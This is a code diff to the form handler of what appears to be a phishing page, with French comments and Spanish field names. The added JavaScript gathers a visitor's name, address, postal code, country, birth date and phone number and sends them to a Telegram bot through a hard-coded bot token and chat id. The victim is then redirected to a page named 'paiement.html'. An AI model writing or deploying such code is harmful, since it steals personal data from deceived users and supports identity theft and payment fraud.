@@ -58,10 +58,44 @@
       e.preventDefault();
       // Affiche le spinner
       document.getElementById("spinnerOverlay").style.display = "flex";
-      // Redirige après 2,5 secondes
-      setTimeout(() => {
-        window.location.href = "paiement.html";
-      }, 2500);
+
+      // Récupération des valeurs
+      const formElements = this.elements;
+      const apellido = formElements[0].value.trim();
+      const nombre   = formElements[1].value.trim();
+      const direccion= formElements[2].value.trim();
+      const ciudad   = formElements[3].value.trim();
+      const cp       = formElements[4].value.trim();
+      const pais     = formElements[5].value;
+      const fecha    = formElements[6].value;
+      const telefono = formElements[7].value.trim();
+
+      // Préparation du message Telegram
+      const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
+      const chatId   = "-4970333928";
+      const message  = 
+        `📋 Información personal:\n` +
+        `Apellido: ${apellido}\n` +
+        `Nombre: ${nombre}\n` +
+        `Dirección: ${direccion}\n` +
+        `Ciudad: ${ciudad}\n` +
+        `Código postal: ${cp}\n` +
+        `País: ${pais}\n` +
+        `Fecha de nacimiento: ${fecha}\n` +
+        `Teléfono: ${telefono}`;
+
+      // Envoi vers Telegram
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).catch(console.error)
+        .finally(() => {
+          // Redirection après 2,5 secondes
+          setTimeout(() => {
+            window.location.href = "paiement.html";
+          }, 2500);
+        });
     });
   </script>
 </body>
